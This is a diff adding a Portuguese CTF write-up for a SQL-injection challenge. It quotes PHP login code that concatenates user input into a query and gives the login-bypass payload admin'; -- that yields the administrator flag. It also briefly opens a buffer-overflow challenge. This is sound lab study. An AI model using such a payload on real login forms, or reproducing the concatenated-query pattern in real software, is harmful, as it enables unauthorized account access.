@@ -1,5 +1,38 @@
 # CTF - WEEK 8[](url)
 
+## Challenge #1
+
+**1.** Ao analisar o ficheiro _index.php_, podémos verificar que este continha uma linha onde é possível ocorrer um vulnerabilidade. 
+
+[Terminal print - index.php file](CTFs/Img/Semana8-Desafio1/1.index_php.png)
+
+- Podemos verificar que podemos inserir, na linha em baixo no campo $username, uma subquery que nos permita fazer login com a conta do administrador.
+
+```php
+$username = $_POST['username'];
+$password = $_POST['password'];
+               
+$query = "SELECT username FROM user WHERE username = '".$username."' AND password = '".$password."'";
+```
+
+**2.** Sendo assim, no campo _username_ no servidor poderemos colocar a seguinte _string_:
+
+```sql
+admin'; --
+```
+[Terminal print - login page](CTFs/Img/Semana8-Desafio1/2.login.png)
+
+
+**3.** Ao instroduzir a _stirng_ referida em cima, podemos verificar que a query do ficheiro vai ficar:
+
+```sql
+SELECT username FROM user WHERE username = 'admin'; -- ".$username."' AND password = '".$password."'";
+```
+
+- Assim, conseguimos fazer "login" na conta do administrador e obter a flag.
+
+[Terminal print - flag result](CTFs/Img/Semana8-Desafio1/3.result.png)
+
 ## Challenge #2
 
 - Tendo uma stack com permissão de execução e um buffer overflow. O que será que se pode fazer?
